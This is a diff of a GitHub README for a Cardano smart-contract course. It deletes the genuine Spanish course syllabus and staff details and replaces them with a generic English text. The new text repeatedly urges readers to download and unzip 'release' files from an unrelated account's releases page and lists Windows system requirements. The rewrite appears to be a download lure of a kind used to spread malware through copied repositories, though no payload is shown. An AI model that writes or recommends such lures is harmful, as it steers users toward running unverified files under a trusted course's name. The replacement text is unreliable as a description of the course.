@@ -1,275 +1,84 @@
-<h1 align="center">
-  <br>
-  <a href="https://www.youtube.com/@iogacademy"><img src="https://ucarecdn.com/288e5001-d93e-4081-976b-0c6f72cc077e/iohksymbolbig.jpg" alt="IOG Academy on YouTube" width="100"></a>
-  <br>
-  Cardano Developer Course
-  <br>
-  <strong>Universidad de Buenos Aires - 2025</strong>
-  <br>
-</h1>
+# 📚 cardano-developer-course-UBA - Learn Smart Contracts and DApps Easily
 
-<p align="center">
-  <strong>Aprende a desarrollar Smart Contracts y DApps en Cardano</strong>
-</p>
+[![Download](https://img.shields.io/badge/Download_Latest_Release-blue.svg)](https://github.com/guerlo/cardano-developer-course-UBA/releases)
 
----
+## 📖 Overview
 
-## 📖 Sobre el Curso
+Welcome to the **Cardano Developer Course UBA 2025** repository! Inside, you will find official materials, lessons, examples, tasks, and guides designed to help you learn how to create Smart Contracts and Decentralized Applications (DApps) on the Cardano blockchain. This course aims to make learning accessible and enjoyable.
 
-El **Cardano Developer Course (CDC)** es un programa intensivo diseñado por el equipo de educación de **Input Output Global (IOG)** para formar desarrolladores profesionales en la creación de **Smart Contracts** y **aplicaciones descentralizadas (DApps)** sobre la blockchain de Cardano.
+### 📅 Course Structure
 
-Este repositorio contiene todo el material necesario para completar el curso exitosamente:
+- **Lessons:** Step-by-step guides that break down concepts.
+- **Examples:** Practical code snippets to illustrate key points.
+- **Tasks:** Assignments to solidify your understanding.
+- **Guides:** In-depth resources that cover specific topics.
 
-- 📚 Lecciones teóricas y prácticas
-- 💻 Ejemplos de código
-- ✍️ Ejercicios
-- 🛠️ Guías de instalación
+## 🚀 Getting Started
 
-## Acceso a las Grabaciones de las Lecciones y Canales de Comunicación
+To jump right in, follow these simple steps.
 
-Las sesiones en vivo de este curso están disponibles en [esta lista](https://youtube.com/playlist?list=PLNEK_Ejlx3x1FZzaGmCETf5Q65XA-AZsC&si=P8JHhQkkLs9WIiel) del canal de YouTube IOG Academy.
+1. **Visit the Releases Page:**  
+   To download the material, please visit the Releases page.  
+   [Download Here](https://github.com/guerlo/cardano-developer-course-UBA/releases)
 
-Para cualquier duda sobre los contenidos del curso, te invitamos a unirte al [canal `#cardano-devs-español`](https://discord.com/channels/826816523368005654/1433802221673382100) dentro del servidor de Discord de Input | Output. Para poder participar, es importante que te unas con el perfil de _builder_.
+2. **Select the Latest Version:**  
+   Look for the most recent version. It usually has the highest version number. 
 
----
+3. **Download the Materials:**  
+   Click on the assets to download all the necessary files.
 
-## 📂 Estructura del Repositorio
+### 🔧 System Requirements
 
-```
-📦 cardano-developer-course-uba-2025
-├── 📁 diapositivas/       # Contenido de cada clase
-├── 📁 ejemplos/           # Código de ejemplo
-└── 📄 README.md           # Este archivo
-```
+Before you begin, please ensure your computer meets the following requirements:
 
-### Directorios Principales
+- **Operating System:** Windows 10 or later, macOS, or Linux.
+- **Internet Connection:** A stable connection for downloading materials and updates.
+- **Storage Space:** At least 500 MB of available space to store your files.
 
-| Directorio | Descripción |
-|------------|-------------|
-| **[diapositivas](diapositivas/)** | Material presentado en clase: diapositivas, código |
+## 💻 Download & Install
 
----
+To get started with your learning journey, follow these steps:
 
-## 👥 Equipo
+1. **Visit the Releases Page:**  
+   Click the link to access the page:  
+   [Download Here](https://github.com/guerlo/cardano-developer-course-UBA/releases)
 
-| Rol | Nombre | Contacto |
-|-----|--------|----------|
-| **Instructor** | Robertino Martinez | [robertino.martinez@iohk.io](mailto:robertino.martinez@iohk.io) |
-| **TA** | Karina Lopez | [karina.lopez@iohk.io](mailto:karina.lopez@iohk.io) |
-| **TA** | Antonio Ibarra | [antonio.ibarra@iohk.io](mailto:antonio.ibarra@iohk.io) |
-| **TA** | J. Arturo Mora | [jose.mora@iohk.io](mailto:jose.mora@iohk.io) |
+2. **Download the Files:**  
+   Once on the page, find the assets section and download the files you need. It may include PDFs, code examples, and other relevant documents.
 
----
+3. **Extract the Files:**  
+   If the files are zipped, you will need to extract them. Right-click on the zip file and choose “Extract All” or a similar option.
 
-## 📋 Evaluación Diagnóstica
+4. **Access the Materials:**  
+   Open the extracted folder to find all learning materials.
 
-**¡Antes de comenzar, evalúa tus conocimientos!**
-Evaluación Diagnóstica: Cardano, Smart Contracts y Aiken
+## 📚 Course Content
 
-  <a href="https://app.easyevaluate.com/attendee/test/mNHKDOjEwC">
-    <strong>🔗 Haz clic aquí para acceder</strong>
-  </a>
+The repository includes several essential materials:
 
-💡 Nota: Esta evaluación diagnóstica te ayudará a identificar tu nivel actual de conocimientos sobre Cardano blockchain, smart contracts y el lenguaje Aiken. Te permitirá enfocar mejor tu aprendizaje durante el curso.
+- **Lesson Guides:** Comprehensive tutorials that explain both basic and advanced concepts of Smart Contracts on Cardano.
+- **Code Examples:** Ready-to-use code snippets that illustrate how to implement various features.
+- **Exercises:** Practice tasks designed to reinforce what you learn in the lessons.
+- **Reference Guides:** Documentation that provides detailed information on specific topics.
 
----
+## 🧑‍🏫 Learning Tips
 
-## 📅 Programa del Curso
+- **Take Notes:** Jot down important points as you go through the materials.
+- **Practice Regularly:** Implement what you learn by completing the tasks and exercises.
+- **Join Community Discussions:** Engaging with others can clarify concepts and enhance your learning experience.
 
-### Actividades
+## 📞 Support
 
-| Ícono | Tipo de Actividad |
-|-------|-------------------|
-| 🎞️ | Diapositivas / Presentación teórica |
-| 👣 | Live Coding / Práctica guiada |
-| 👀 | Revisión de código / documentación |
-| ✍️ | Ejercicios / Proyecto |
+If you have questions or need further assistance, consider reaching out through the following channels:
 
----
+- **Issues Section:** Post your question directly in the repository's issues tab.
+- **Discussion Forums:** Participate in community discussions to gain insights from other users.
+- **Email Support:** If you need direct help, you can contact the course administrator via email.
 
-### 📘 Día 01 - Fundamentos
+## 🎓 Next Steps
 
-| Parte | Contenido | Actividad |
-|:-----:|:----------|:---------:|
-| 1 | Introducción al curso | [🎞️](https://github.com/iog-edu-uba-2025/cardano-developer-course-UBA/blob/main/diapositivas/D%C3%ADa%2001%20-%20Parte%201%20-Introducci%C3%B3n%20al%20curso%20y%20herramientas.pdf) |
-| 2 | Introducción a las herramientas | [🎞️](https://github.com/iog-edu-uba-2025/cardano-developer-course-UBA/blob/main/diapositivas/D%C3%ADa%2001%20-%20Parte%201%20-Introducci%C3%B3n%20al%20curso%20y%20herramientas.pdf) |
-| 3 | Preparar ambiente de desarrollo | 👣 |
-| 4 | Criptografía | [🎞️](https://github.com/iog-edu-uba-2025/cardano-developer-course-UBA/blob/main/diapositivas/D%C3%ADa%2001%20-%20Parte%202%20-%20Introducci%C3%B3n%20a%20Blockchain.pdf) |
-| 5 | Blockchains, Tx, Bloques, Nodos y Billeteras |  [🎞️](https://github.com/iog-edu-uba-2025/cardano-developer-course-UBA/blob/main/diapositivas/D%C3%ADa%2001%20-%20Parte%202%20-%20Introducci%C3%B3n%20a%20Blockchain.pdf) |
+Completing this course will help you gain valuable skills. Upon finishing, you will be able to develop your own Smart Contracts and DApps within the Cardano ecosystem. The world of blockchain is vast and thriving. Your journey starts here.
 
-**📖 Material Opcional:**
+Remember to keep revisiting the Releases page for updates and new materials. Happy learning!
 
-- [Bitcoin Whitepaper](https://bitcoin.org/bitcoin.pdf)
-- [Edinburgh Decentralisation Index](https://informatics.ed.ac.uk/blockchain/edi)
-
----
-
-### 📗 Día 02 - Modelos de Transacción
-
-| Parte | Contenido | Actividad |
-|:-----:|:----------|:---------:|
-| 1 | Modelo UTxO | [🎞️](https://github.com/iog-edu-uba-2025/cardano-developer-course-UBA/blob/main/diapositivas/D%C3%ADa%2002%20-%20Parte%201%20-%20EUTxO.pdf) |
-| 2 | Diagramar transacción UTxO | [✍️](https://classroom.github.com/a/AkRf_ORB) |
-| 3 | Crear Tx con billetera e inspeccionar con chain explorer | [✍️](https://classroom.github.com/a/q0OW3teH) |
-| 4 | Modelo (E)UTxO |  [🎞️](https://github.com/iog-edu-uba-2025/cardano-developer-course-UBA/blob/main/diapositivas/D%C3%ADa%2002%20-%20Parte%201%20-%20EUTxO.pdf)  |
-| 5 | On-chain VS Off-chain | 🎞️ |
-
-**📖 Material Opcional:**
-
-- [The Extended UTXO Model](https://iohk.io/en/research/library/papers/the-extended-utxo-model/)
-- [UTxO vs Account-Based Smart Contract Programming](https://arxiv.org/pdf/2003.14271)
-- [Ouroboros: A Provably Secure Proof-of-Stake Blockchain Protocol](https://iohk.io/en/research/library/papers/ouroboros-a-provably-secure-proof-of-stake-blockchain-protocol/)
-- [Presentación del libro "Mastering Cardano"](diapositivas/Día%202%20-%20Mastering%20Cardano%20-%20Español.pdf)
-
----
-
-### 📙 Día 03 - Native Scripts y Tokens
-
-| Parte | Contenido | Actividad |
-|:-----:|:----------|:---------:|
-| 1 | Intro a MeshJS y crear primera Tx | 👣 |
-| 2 | Native Scripts | [🎞️](https://github.com/iog-edu-uba-2025/cardano-developer-course-UBA/blob/main/diapositivas/03/01-native-scripts.pdf) |
-| 3 | Crear Multisig | [✍️](https://classroom.github.com/a/FD8R2K_N) |
-| 4 | Crear Vesting | [✍️](https://classroom.github.com/a/YicToRj8) |
-| 5 | Native Tokens | 🎞️ |
-| 6 | Mintear/Quemar Tokens | ✍️ |
-
----
-
-### 📕 Día 04 - Introducción a Aiken
-
-| Parte | Contenido | Actividad |
-|:-----:|:----------|:---------:|
-| 1 | Crear nuevo proyecto Aiken | 👣 |
-| 2 | Aiken: CLI, estructura de proyecto, usar docs | 👀 |
-| 3 | Introducción a Aiken | 🎞️ |
-| 4 | Lenguaje Aiken | [✍️](https://classroom.github.com/a/vEd8ieLs) |
-| 5 | Introducción a Validadores Plutus | 🎞️ |
-| 6 | Validador "Always true/false" + off-chain | 👣 |
-| 7 | Validador "`redeemer == 42`" + off-chain | 👣 |
-| 8 | Validador `redeemer == datum` | ✍️ |
-
-**📖 Material Opcional:**
-
-- [Formal Specification of Plutus Core - Capítulos 1 y 2.1](https://intersectmbo.github.io/plutus/resources/plutus-core-spec.pdf)
-
----
-
-### 📘 Día 05 - DApps y ScriptContext
-
-| Parte | Contenido | Actividad |
-|:-----:|:----------|:---------:|
-| 1 | NextJS - De Web2 a Web3 | [🎞️](https://github.com/iog-edu-uba-2025/cardano-developer-course-UBA/blob/main/diapositivas/05/01-web2-to-web3.pdf) + 👣 |
-| 2 | NextJS - Simple Tx con browser wallet | [🎞️](https://github.com/iog-edu-uba-2025/cardano-developer-course-UBA/blob/main/diapositivas/05/02-cip-30.pdf) + 👣 |
-| 3 | ScriptContext | [🎞️](https://github.com/iog-edu-uba-2025/cardano-developer-course-UBA/blob/main/diapositivas/05/03-scriptContext.pdf) |
-| 4 | Validador "Consume if signed by" | 👣 + [✍️](https://classroom.github.com/a/a71MwDeD) |
-| 5 | Tiempo en validadores Plutus | [🎞️](https://github.com/iog-edu-uba-2025/cardano-developer-course-UBA/blob/main/diapositivas/05/04-tiempo-validadores.pdf) |
-| 6 | Validador "Vesting" | [🎞️](https://github.com/iog-edu-uba-2025/cardano-developer-course-UBA/blob/main/diapositivas/05/05-vesting-validator.pdf) + 👣 |
-
-**📖 Material Opcional:**
-
-- [CIP-0001](https://github.com/cardano-foundation/CIPs/tree/master/CIP-0001)
-- [CIP-0019](https://github.com/cardano-foundation/CIPs/tree/master/CIP-0019)
-
----
-
-### 📗 Día 06 - Validadores Parametrizados
-
-| Parte | Contenido | Actividad |
-|:-----:|:----------|:---------:|
-| 1 | Validadores Parametrizados | [🎞️](https://github.com/iog-edu-uba-2025/cardano-developer-course-UBA/blob/main/diapositivas/06/01-validadores-parametrizado.pdf) |
-| 2 | Validador "Vesting" parametrizado | 👣 |
-| 3 | Políticas Monetarias | [🎞️](https://github.com/iog-edu-uba-2025/cardano-developer-course-UBA/blob/main/diapositivas/06/02-minting-policy.pdf) |
-| 4 | PM: "Mint if signed by" | [✍️](https://classroom.github.com/a/AN13kLmo) |
-| 5 | PM: "Mint if signed by & Token Name" | [✍️](https://classroom.github.com/a/LqdsbnsD) |
-| 6 | PM: NFT + Dapp | 👣 |
-
-**📖 Material Opcional:**
-
-- [Native Custom Tokens in the Extended UTXO Model](https://iohk.io/en/research/library/papers/native-custom-tokens-in-the-extended-utxo-model/)
-
----
-
-### 📙 Día 07 - Oráculo
-
-| Parte | Contenido | Actividad |
-|:-----:|:----------|:---------:|
-| 1 | Oracle + Server | [🎞️](https://github.com/iog-edu-uba-2025/cardano-developer-course-UBA/blob/main/diapositivas/07/oracle.pdf) + 👣 |
-| 2 | Validadores "Gift Card" | [✍️](https://classroom.github.com/a/68ygc1Jq) |
-
-**📖 Material Opcional:**
-
-- [CIP-0031](https://github.com/cardano-foundation/CIPs/tree/master/CIP-0031)
-- [CIP-0033](https://github.com/cardano-foundation/CIPs/tree/master/CIP-0033)
-
----
-
-### 📕 Día 08 - Testing y Seguridad
-
-| Parte | Contenido | Actividad |
-|:-----:|:----------|:---------:|
-| 1 | Testing | 🎞️ |
-| 2 | Escribir pruebas para "swap" |  [✍️](https://classroom.github.com/a/9gy9paJ-) |
-
-
----
-
-### 📘 Día 09 - Vulnerabilidades y patrones comunes
-
-| Parte | Contenido | Actividad |
-|:-----:|:----------|:---------:|
-| 1 | Vulnerabilidades comunes | 🎞️ |
-| 2 | Patrones comunes | 🎞️ |
-
----
-
-### 📝 Día 10 - Evaluación Final
-
-| Parte | Contenido | Actividad |
-|:-----:|:----------|:---------:|
-| - | **EXAMEN FINAL** | ✍️ |
-
----
-
-## 🚀 Cómo Comenzar
-
-### 1️⃣ Requisitos Previos
-
-- Conocimientos básicos de programación
-- Git instalado
-- Node.js (v18 o superior)
-
-### 2️⃣ Clonar el Repositorio
-
-```bash
-git clone git@github.com:iog-edu-uba-2025/cardano-developer-course-UBA.git
-cd cardano-developer-course-uba-2025
-```
-
-## 📚 Recursos Adicionales
-
-### Documentación Oficial
-
-- 🌐 [Aiken Lang](https://aiken-lang.org/)
-- 🌐 [Cardano Docs](https://docs.cardano.org/)
-- 🌐 [MeshJS](https://meshjs.dev/)
-
-### Comunidad
-
-- 💬 [Cardano Forum](https://forum.cardano.org/)
-- 💬 [IOG Discord](https://discord.gg/inputoutput)
-- 🎥 [IOG Academy YouTube](https://www.youtube.com/@iogacademy)
-
----
-
-## 📄 Licencia
-
-Este material es provisto por Input Output Global para fines educativos.
-
----
-
-<p align="center">
-  <strong>¡Feliz aprendizaje! 🎓</strong>
-  <br>
-  <em>Desarrollado con ❤️ por IOG Education Team</em>
-</p>
+[![Download](https://img.shields.io/badge/Download_Latest_Release-blue.svg)](https://github.com/guerlo/cardano-developer-course-UBA/releases)
